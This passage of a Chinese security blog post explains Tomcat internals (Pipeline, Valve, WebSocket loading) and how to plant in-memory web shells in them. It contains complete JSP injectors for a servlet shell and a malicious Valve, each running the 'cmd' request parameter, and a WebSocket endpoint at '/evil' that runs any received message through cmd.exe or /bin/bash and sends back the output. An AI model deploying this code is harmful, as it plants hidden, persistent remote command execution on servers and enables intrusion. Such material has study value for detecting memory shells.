class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> Runtime.getRuntime().exec(req.getParameter(<span class="string">&quot;cmd&quot;</span>)).getInputStream();</span><br><span class="line">            <span class="type">BufferedInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(is);</span><br><span class="line">            <span class="type">int</span> len;</span><br><span class="line">            <span class="keyword">while</span> ((len = bis.read())!=-<span class="number">1</span>)&#123;</span><br><span class="line">                resp.getWriter().write(len);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">            <span class="built_in">super</span>.doPost(req, resp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获得StandardContext</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">stdcontext</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//从StandardContext.createWapper()获得一个Wapper对象</span></span><br><span class="line">    <span class="type">Wrapper</span> <span class="variable">newWrapper</span> <span class="operator">=</span> stdcontext.createWrapper();</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> httpServlet.getClass().getSimpleName();</span><br><span class="line">    newWrapper.setName(name);</span><br><span class="line">    newWrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">    newWrapper.setServlet(httpServlet);</span><br><span class="line">    newWrapper.setServletClass(httpServlet.getClass().getName());</span><br><span class="line">    <span class="comment">//将Wrapper添加到StandardContext</span></span><br><span class="line">    stdcontext.addChild(newWrapper);</span><br><span class="line">    stdcontext.addServletMappingDecoded(<span class="string">&quot;/Sentiment&quot;</span>, name);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h3 id="2-4valve内存马">2.4valve内存马</h3><h5 id="2-4-1-valve是什么">2.4.1 valve是什么</h5><p>在上文有文章介绍过valve是什么可以在看以下文章<a href="https://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09">https://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09</a></p><p><a href="https://www.cnblogs.com/coldridgeValley/p/5816414.html">https://www.cnblogs.com/coldridgeValley/p/5816414.html</a></p><p><a href="https://xz.aliyun.com/t/13639?time__1311=mqmxnQ0QiQi%3DDtDkDlxGOUDyj%2BIni33EErD&amp;alichlgref=https%3A%2F%2Fcn.bing.com%2F">https://xz.aliyun.com/t/13639?time__1311=mqmxnQ0QiQi%3DDtDkDlxGOUDyj%2BIni33EErD&amp;alichlgref=https%3A%2F%2Fcn.bing.com%2F</a></p><p>这里直接贴出参考文章的解释</p><p>tomcat中的Container有4种，分别是Engine、Host、Context和Wrapper，这4个Container的实现类分别是StandardEngine、StandardHost、StandardContext和StandardWrapper。4种容器的关系是包含关系，Engine包含Host，Host包含Context，Context包含Wrapper，Wrapper则代表最基础的一个Servlet<font style="color:rgb(51, 51, 51);">。<br></font>tomcat由Connector和Container两部分组成，而当网络请求过来的时候Connector先将请求包装为Request，然后将Request交由Container进行处理，最终返回给请求方。而Container处理的第一层就是Engine容器，但是在tomcat中Engine容器不会直接调用Host容器去处理请求，那么请求是怎么在4个容器中流转的，4个容器之间是怎么依次调用的呢？</p><p>原来，当请求到达Engine容器的时候，Engine并非是直接调用对应的Host去处理相关的请求，而是调用了自己的一个组件去处理，这个组件就叫做pipeline组件，跟pipeline相关的还有个也是容器内部的组件，叫做valve组件。</p><p>Pipeline的作用就如其中文意思一样——管道，可以把不同容器想象成一个独立的个体，那么pipeline就可以理解为不同容器之间的管道，道路，桥梁。那Valve这个组件是什么东西呢？Valve也可以直接按照字面意思去理解为阀门。我们知道，在生活中可以看到每个管道上面都有阀门，Pipeline和Valve关系也是一样的。Valve代表管道上的阀门，可以控制管道的流向，当然每个管道上可以有多个阀门。如果把Pipeline比作公路的话，那么Valve可以理解为公路上的收费站，车代表Pipeline中的内容，那么每个收费站都会对其中的内容做一些处理（收费，查证件等）。</p><p>在Catalina中，4种容器都有自己的Pipeline组件，每个Pipeline组件上至少会设定一个Valve，这个Valve我们称之为BaseValve，也就是基础阀。基础阀的作用是连接当前容器的下一个容器（通常是自己的自容器），可以说基础阀是两个容器之间的桥梁。</p><p>Pipeline定义对应的接口Pipeline，标准实现了StandardPipeline。Valve定义对应的接口Valve，抽象实现类ValveBase，4个容器对应基础阀门分别是StandardEngineValve，StandardHostValve，StandardContextValve，StandardWrapperValve。在实际运行中，Pipeline和Valve运行机制如下图：</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716440271103-726110c8-9d27-4a52-9bbd-47ea3d19cd07.png" alt=""></p><h5 id="2-4-2调用过程">2.4.2调用过程</h5><p>这里我们在filter的方法里下一个断点看一下 Valve调用过程</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716449163052-b3a03e1e-329a-4e4d-8398-d488579c8c21.png" alt=""></p><p>我们可以看到箭头中指的地方</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716449314426-4e35fd99-a769-4699-a116-5c049372f7d6.png" alt="">在接收到Http请求之后调用了箭头所指的方法其调用CoyoteAdapter类里面的service方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716449508615-332fd3b5-6f36-4228-a88e-4dabc9df6aa1.png" alt=""></p><p>该方法中获取了Pipeline的第一个Valve，并且调用了invoke也就是StandardEngineValve</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716449722618-6c65e4a5-4216-4104-88b9-bd9ac9c5b1dd.png" alt=""></p><p>继续跟进</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716449761818-4a3212b2-acb8-494f-8d01-6824ff1bb6af.png" alt=""></p><p>发现调用了下一个valve也就是调用栈中所表示出来的那些valve就不一一列举了，最后调用到StandardWrapperValve这个valve然后就调用filter过滤链之后在调用servlet</p><p>所以在这里我们可以思考一下唉，如果我们能够在这个pipeline这个管道中给他添加一个我们恶意的valve那也就是可以注入内存马，这里我们需要找到一个可以将valve加入到管道中的方法，我们可以发现pipeline这个接口中存在一个方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716450092523-05413266-8bf2-453a-99f4-3f708c0ede3f.png" alt=""></p><p>存在一个addValve方法可以添加进去。我们看一下Pipeline的实现类</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716450704081-7e2bacee-1e3c-4dae-adc9-4081a9a38731.png" alt=""></p><p>所以只需要获取StanderdPipeline 对象就可以了。又因为我们在jsp中不能够直接获取到StanderdPipeline对象只能获取像standardcontext 这类对象，我们看看他有没有能直接获取StanderdPipeline对象的方法。</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716451334308-dc7c779d-aa8a-4f37-b031-519ea66c5a46.png" alt=""></p><p>可以发现在里面有getPipeline这个方法。就是返回的StanderdPipeline对象所以我们就可以编写我们的内存马了。</p><p>总结</p><p>编写Valve恶意类，实现Valve接口，重写invoke-&gt;恶意代码逻辑</p><p>获取StandardContext对象</p><p>StandardContext.getPipeline获取StandardPipeline</p><p>StandardPipeline.addValve(Valve_Shell)添加恶意Valve</p><p>分析流程参考网上的我自己的环境有点问题没法进入调试</p><p><a href="https://lemono.fun/tomcat-valve-ws/#%E5%8A%A8%E6%80%81%E6%B7%BB%E5%8A%A0Valve">https://lemono.fun/tomcat-valve-ws/#%E5%8A%A8%E6%80%81%E6%B7%BB%E5%8A%A0Valve</a></p><p><a href="https://xz.aliyun.com/t/13639?time__1311=mqmxnQ0QiQi%3DDtDkDlxGOUDyj%2BIni33EErD&amp;alichlgref=https%3A%2F%2Fcn.bing.com%2F">https://xz.aliyun.com/t/13639?time__1311=mqmxnQ0QiQi%3DDtDkDlxGOUDyj%2BIni33EErD&amp;alichlgref=https%3A%2F%2Fcn.bing.com%2F</a></p><h5 id="2-4-3demo编写">2.4.3demo编写</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.*&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.valves.ValveBase&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">EvilValve</span> <span class="keyword">extends</span> <span class="title class_">ValveBase</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;111&quot;</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">            &#125; &#125; &#125;%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">// 更简单的方法 获取StandardContext</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    standardContext.getPipeline().addValve(<span class="keyword">new</span> <span class="title class_">EvilValve</span>());</span><br><span class="line"></span><br><span class="line">    out.println(<span class="string">&quot;inject success&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h3 id="2-5websocket内存马">2.5websocket内存马</h3><h4 id="2-5-1websocket简介">2.5.1websocket简介</h4><p>参考：<a href="https://stefan.blog.csdn.net/article/details/120025498">https://stefan.blog.csdn.net/article/details/120025498</a></p><p>WebSocket是一种全双工通信协议，即客户端可以向服务端发送请求，服务端也可以主动向客户端推送数据。这样的特点，使得它在一些实时性要求比较高的场景效果斐然（比如微信朋友圈实时通知、在线协同编辑等）。主流浏览器以及一些常见服务端通信框架（Tomcat、netty、undertow、webLogic等）都对WebSocket进行了技术支持。</p><h4 id="2-5-2服务端实现">2.5.2服务端实现</h4><h5 id="2-5-2-1注解方式实现">2.5.2.1注解方式实现</h5><ul><li>value：必要，String类型，此Endpoint部署的URI路径。</li><li>configurator：非必要，继承ServerEndpointConfig.Configurator的类，主要提供ServerEndpoint对象的创建方式扩展（如果使用Tomcat的WebSocket实现，默认是反射创建ServerEndpoint对象）。</li><li>decoders：非必要，继承Decoder的类，用户可以自定义一些消息解码器，比如通信的消息是一个对象，接收到消息可以自动解码封装成消息对象。</li><li>encoders：非必要，继承Encoder的类，此端点将使用的编码器类的有序数组，定义解码器和编码器的好处是可以规范使用层消息的传输。</li><li>subprotocols：非必要，String数组类型，用户在WebSocket协议下自定义扩展一些子协议。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ServerEndpoint(value = &quot;/ws/&#123;userId&#125;&quot;, encoders = &#123;MessageEncoder.class&#125;, decoders = &#123;MessageDecoder.class&#125;, configurator = MyServerConfigurator.class)</span></span><br></pre></td></tr></table></figure><p>@ServerEndpoint可以注解到任何类上，但是想实现服务端的完整功能，还需要配合几个生命周期的注解使用，这些生命周期注解只能注解在方法上：</p><ul><li>@OnOpen 建立连接时触发。</li><li>@OnClose 关闭连接时触发。</li><li>@OnError 发生异常时触发。</li><li>@OnMessage 接收到消息时触发。</li></ul><h5 id="2-5-2-2继承抽象类">2.5.2.2继承抽象类</h5><p>继承抽象类Endpoint，重写几个生命周期方法，实现两个接口，比加注解 @ServerEndpoint方式更麻烦。</p><p>其中重写onMessage需要实现接口jakarta.websocket.MessageHandler，给Endpoint分配URI路径需要实现接口jakarta.websocket.server.ServerApplicationConfig。</p><p>而URI path、encoders、decoders、configurator等配置信息由jakarta.websocket.server.ServerEndpointConfig管理，默认实现jakarta.websocket.server.DefaultServerEndpointConfig。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ServerEndpointConfig</span> <span class="variable">serverEndpointConfig</span> <span class="operator">=</span> ServerEndpointConfig.Builder.create(WebSocketServerEndpoint3.class, <span class="string">&quot;/ws/&#123;userId&#125;&quot;</span>).decoders(decoderList).encoders(encoderList).configurator(<span class="keyword">new</span> <span class="title class_">MyServerConfigurator</span>()).build();</span><br></pre></td></tr></table></figure><h4 id="Tomcat-WebSocket的加载">Tomcat WebSocket的加载</h4><p>Tomcat提供了一个javax.servlet.ServletContainerInitializer的实现类org.apache.tomcat.websocket.server.WsSci。</p><p>ServletContainerInitializer（SCI） 是 Servlet 3.0 新增的一个接口，主要用于在容器启动阶段通过编程风格注册Filter, Servlet以及Listener，以取代通过web.xml配置注册。这样就利于开发内聚的web应用框架.</p><p>具体可看：<a href="https://blog.csdn.net/lqzkcx3/article/details/78507169">Servlet3.0研究之ServletContainerInitializer接口</a></p><p>因此<strong>Tomcat的WebSocket加载是通过SCI机制完成的</strong>。</p><p>WsSci可以处理的类型有三种：</p><ul><li>添加了注解@ServerEndpoint的类</li><li>Endpoint的子类</li><li>ServerApplicationConfig的实现类</li></ul><p>Tomcat在Web应用启动时会在StandardContext的startInternal方法里通过 WsSci 的onStartup方法初始化 Listener 和 servlet，再扫描 classpath下带有注解@ServerEndpoint的类和Endpoint子类</p><p>如果当前应用存在ServerApplicationConfig实现，则通过ServerApplicationConfig获取Endpoint子类的配置（ServerEndpointConfig实例，包含了请求路径等信息）和符合条件的注解类，通过调用addEndpoint将结果注册到WebSocketContainer上；如果当前应用没有定义ServerApplicationConfig的实现类，那么WsSci默认只将所有扫描到的注解式Endpoint注册到WebSocketContainer。因此，如果采用可编程方式定义Endpoint，那么必须添加ServerApplicationConfig实现。</p><p>然后startInternal方法里为ServletContext添加一个过滤器org.apache.tomcat.websocket.server.WsFilter，它用于判断当前请求是否为WebSocket请求，以便完成握手（所以任何Tomcat都可以用<a href="https://github.com/c0ny1/java-memshell-scanner">java-memshell-scanner</a>看到WsFilter）。</p><h4 id="Tomcat-WebSocket内存马的实现">Tomcat WebSocket内存马的实现</h4><p>我们先来回顾一下servlet-api型内存马的实现步骤，拿Filter型举例：</p><ol><li>获取当前的StandardContext</li><li>创建恶意Filter</li><li>创建filterDef封装Filter对象，调用StandardContext.addFilterDef方法将filterDef添加到filterDefs</li><li>创建filterMap将URL和filter进行绑定，调用StandardContext.addFilterMapBefore方法将filterMap添加到filterMaps中</li><li>获取filterConfigs变量，并向其中添加filterConfig对象</li></ol><p>既然要插入恶意Filter，那么我们就需要在Tomcat启动过程中寻找添加FIlter的方法，而filterDef、filterMap、filterConfigs都是StandardContext对象的属性，并且也有相应的add方法，那么我们就需要先获取StandardContext，再调用相应的方法。</p><p>WebSocket内存马也很类似，上一节提到了WsSci 的onStartup扫描 classpath下带有注解@ServerEndpoint的类和Endpoint子类，并且调用addEndpoint方法注册到WebSocketContainer上。那么我们应该从WebSocketContainer出发，而WsServerContainer是在StandardContext里面创建的，那么，显而易见的：</p><ol><li>获取当前的StandardContext</li><li>通过StandardContext获取ServerContainer</li><li>定义一个恶意类，并创建一个ServerEndpointConfig，给这个恶意类分配URI path</li><li>调用ServerContainer.addEndpoint方法，将创建的ServerEndpointConfig添加进去</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ServerContainer</span> <span class="variable">container</span> <span class="operator">=</span> (ServerContainer) req.getServletContext().getAttribute(ServerContainer.class.getName());</span><br><span class="line"><span class="type">ServerEndpointConfig</span> <span class="variable">config</span> <span class="operator">=</span> ServerEndpointConfig.Builder.create(evil.class, <span class="string">&quot;/ws&quot;</span>).build();</span><br><span class="line">container.addEndpoint(config);</span><br></pre></td></tr></table></figure><h4 id="2-5-3完整的jsp注入">2.5.3完整的jsp注入</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.websocket.server.ServerEndpointConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.websocket.server.ServerContainer&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.websocket.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.*&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">C</span> <span class="keyword">extends</span> <span class="title class_">Endpoint</span> <span class="keyword">implements</span> <span class="title class_">MessageHandler</span>.Whole&lt;String&gt; &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> Session session;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onMessage</span><span class="params">(String s)</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Process process;</span><br><span class="line"></span><br><span class="line">                <span class="type">boolean</span> <span class="variable">bool</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().startsWith(<span class="string">&quot;windows&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (bool) &#123;</span><br><span class="line">                    process = Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, s&#125;);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    process = Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, s&#125;);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">                <span class="type">StringBuilder</span> <span class="variable">stringBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">                <span class="type">int</span> i;</span><br><span class="line">                <span class="keyword">while</span> ((i = inputStream.read()) != -<span class="number">1</span>)</span><br><span class="line">                    stringBuilder.append((<span class="type">char</span>)i);</span><br><span class="line">                inputStream.close();</span><br><span class="line"></span><br><span class="line">                process.waitFor();</span><br><span class="line">                session.getBasicRemote().sendText(stringBuilder.toString());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception exception) &#123;</span><br><span class="line">                exception.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onOpen</span><span class="params">(<span class="keyword">final</span> Session session, EndpointConfig config)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.session = session;</span><br><span class="line">            session.addMessageHandler(<span class="built_in">this</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">// String path = request.getParameter(&quot;path&quot;);</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;/evil&quot;</span>;</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">    <span class="type">ServerEndpointConfig</span> <span class="variable">configEndpoint</span> <span class="operator">=</span> ServerEndpointConfig.Builder.create(C.class, path).build();</span><br><span class="line">    <span class="type">ServerContainer</span> <span class="variable">container</span> <span class="operator">=</span> (ServerContainer) servletContext.getAttribute(ServerContainer.class.getName());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (servletContext.getAttribute(path) == <span class="literal">null</span>) &#123;</span><br><span class="line">            container.addEndpoint(configEndpoint);</span><br><span class="line">            servletContext.setAttribute(path, path);</span><br><span class="line">        &#125;</span><br><span class="line">        out.println(<span class="string">&quot;success, connect url path: &quot;</span> + servletContext.getContextPath() + path);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        out.println(e.toString());</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>参考：<a href="https://xz.aliyun.com/t/11549?time__1311=mqmx0DBD2Gd4lOz30%3D3G%3DWwRQDuBhCoD&amp;alichlgref=https%3A%2F%2Fwww.google.com.hk%2F">https://xz.aliyun.com/t/11549?time__1311=mqmx0DBD2Gd4lOz30%3D3G%3DWwRQDuBhCoD&amp;alichlgref=https%3A%2F%2Fwww.google.com.hk%2F</a></p><p><a href="https://paoka1.top/2023/04/21/Tomcat-WebSocket-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/">https://paoka1.top/2023/04/21/Tomcat-WebSocket-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/</a></p><p><a href="https://xz.aliyun.com/t/11566?time__1311=mqmx0DBD2QK7uD0vofDyACFwRQKDu7gYD&amp;alichlgref=https%3A%2F%2Fwww.google.com.hk%2F">https://xz.aliyun.com/t/11566?time__1311=mqmx0DBD2QK7uD0vofDyACFwRQKDu7gYD&amp;alichlgref=https%3A%2F%2Fwww.google.com.hk%2F</a></p><p><a href="https://veo.pub/2022/memshell/#3-websocket%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E6%96%B9%E6%B3%95">https://veo.pub/2022/memshell/#3-websocket%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E6%96%B9%E6%B3%95</a></p><h3 id="2-6upgrade内存马">2.6upgrade内存马</h3><p>参考：<a href="https://mp.weixin.qq.com/s/RuP8cfjUXnLVJezBBBqsYw">https://mp.weixin.qq.com/s/RuP8cfjUXnLVJezBBBqsYw</a></p><p><a href="https://www.freebuf.com/vuls/345119.html">https://www.freebuf.com/vuls/345119.html</a></p><h3 id="2-7executor内存马">2.7executor内存马</h3><p>参考：<a href="https://xz.aliyun.com/t/11593?time__1311=mqmx0DBD2QD%3D%3DBKDsKE4fD9DNqTeoTD">https://xz.aliyun.com/t/11593?time__1311=mqmx0DBD2QD%3D%3DBKDsKE4fD9DNqTeoTD</a></p><p><a href="https://www.freebuf.com/vuls/344812.html">https://www.freebuf.com/vuls/344812.html</a></p><p><a href="https://xz.aliyun.com/t/11613">https://xz.aliyun.com/t/11613</a></p><p><a href="https://xz.aliyun.com/t/13639">https://xz.aliyun.com/t/13639</a></p><h2 id="3-agent内存马">3.agent内存马</h2><p>参考：<a href="https://goodapple.top/archives/1355">https://goodapple.top/archives/1355</a></p><p><a href="https://drun1baby.top/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/#Instrumentation-%E7%9A%84%E5%B1%80%E9%99%90%E6%80%A7">https://drun1baby.top/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/#Instrumentation-%E7%9A%84%E5%B1%80%E9%99%90%E6%80%A7</a></p><p>我们知道Java是一种静态强类型语言，在运行之前必须将其编译成.class字节码，然后再交给JVM处理运行。Java Agent就是一种能在不影响正常编译的前提下，修改Java字节码，进而动态地修改已加载或未加载的类、属性和方法的技术。</p><p>实际上，平时较为常见的技术如热部署、一些诊断工具等都是基于Java Agent技术来实现的。那么Java Agent技术具体是怎样实现的呢？</p><p>对于Agent（代理）来讲，其大致可以分为两种，一种是在JVM启动前加载的premain-Agent，另一种是JVM启动之后加载的agentmain-Agent。这里我们可以将其理解成一种特殊的Interceptor（拦截器），如下图<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/jpeg/25729212/1717067466354-1c0bd6eb-7c4f-4b39-a861-ebd636722a00.jpeg" alt=""><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/jpeg/25729212/1717067470239-a162a378-4e14-4137-a7d1-90c3a10fae26.jpeg" alt=""></p><h3 id="Java-Agent示例">Java Agent示例</h3><h4 id="premain-Agent">premain-Agent</h4><p>我们首先来实现一个简单的premain-Agent，创建一个Maven项目，编写一个简单的premain-Agent</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.java.premain.agent;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"> </span><br><span class="line"><span 